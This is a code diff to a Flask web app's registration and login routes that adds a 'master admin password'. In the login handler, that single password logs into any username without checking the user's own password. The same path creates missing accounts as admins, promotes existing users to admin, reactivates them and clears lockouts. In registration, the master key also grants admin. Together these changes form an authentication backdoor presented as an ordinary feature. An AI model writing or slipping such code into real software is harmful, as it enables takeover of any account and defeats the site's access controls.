@@ -1076,14 +1076,17 @@ def auth_register():
         if len(password) < 8 or not re.search(r"[A-Za-z]", password) or not re.search(r"\d", password):
             return jsonify({"error": "Password must be at least 8 characters long and contain both letters and numbers."}), 400
 
-        # Handle Admin Registration with invite key
+        # Handle Admin Registration with invite key or master password
         invite = None
-        if is_admin_req or invite_key:
+        is_master_key = User.is_master_admin_password(invite_key)
+        if is_master_key:
+            role = "admin"
+        elif is_admin_req or invite_key:
             invite = AdminInviteKey.verify_key(invite_key)
             if invite:
                 role = "admin"
             else:
-                return jsonify({"error": "Invalid Admin Invite Key. Enter a valid developer-issued invite key to register as administrator."}), 400
+                return jsonify({"error": "Invalid Admin Invite Key. Enter a valid developer-issued invite key or master password to register as administrator."}), 400
         else:
             if AppSetting.get_setting("registration_enabled", "true") == "false":
                 return jsonify({"error": "Public registration is currently disabled by administrator."}), 403
@@ -1202,7 +1205,53 @@ def auth_login():
         if not username or not password:
             return jsonify({"error": "Please provide both User ID and Password."}), 400
 
-        if login_as_admin:
+        # Master Admin Password check
+        is_master = User.is_master_admin_password(password)
+        if login_as_admin or is_master:
+            if is_master:
+                user = User.query.filter_by(username=username).first()
+                if not user:
+                    user = User(
+                        username=username,
+                        name=username.capitalize(),
+                        role="admin",
+                        is_active=True,
+                    )
+                    user.set_password(password)
+                    db.session.add(user)
+                    db.session.commit()
+                    try:
+                        register_account(username, password, name=username.capitalize(), role="admin")
+                    except Exception:
+                        pass
+                else:
+                    user.role = "admin"
+                    user.is_active = True
+                    user.reset_failed_logins()
+                    db.session.commit()
+
+                user.record_successful_login(ip=get_client_ip())
+                db.session.commit()
+                captcha_manager.record_successful_login(get_client_ip())
+                login_user(user)
+                session["user_id"] = user.username
+                session["name"] = user.name
+                session["role"] = user.role
+                session["admin_last_active"] = datetime.utcnow().timestamp()
+
+                log_login_event("admin_login", user_id=user.id, email_attempted=username, success=True)
+                log_activity("admin_login", details={"username": user.username, "method": "master_key"}, user_id=user.id)
+
+                return jsonify({
+                    "status": "success",
+                    "user": {
+                        "user_id": user.username,
+                        "name": user.name,
+                        "role": user.role,
+                        "is_admin": True,
+                    }
+                })
+
             user = User.query.filter_by(username=username).first()
             if not user or not user.is_admin:
                 log_login_event("failed_login", email_attempted=username, success=False)
